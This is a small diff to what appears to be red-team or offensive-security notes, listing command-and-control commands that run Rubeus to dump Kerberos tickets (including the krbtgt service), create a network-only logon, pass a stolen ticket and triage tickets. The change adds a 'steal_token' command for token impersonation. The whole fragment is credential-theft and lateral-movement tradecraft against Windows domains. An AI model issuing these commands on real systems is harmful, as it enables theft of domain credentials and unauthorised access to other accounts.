@@ -31,7 +31,7 @@ execute-assembly C:\Users\Public\Rubeus.exe dump /luid:0x1c6be # krbtgt/insomnia
 execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt
 execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe 
 execute-assembly C:\Users\Public\Rubeus.exe ptt /luid:0x21d8e17 /ticket:[...snip...]
-
+steal_token 4652
 ```
 ```
 execute-assembly C:\Users\Public\Rubeus.exe triage
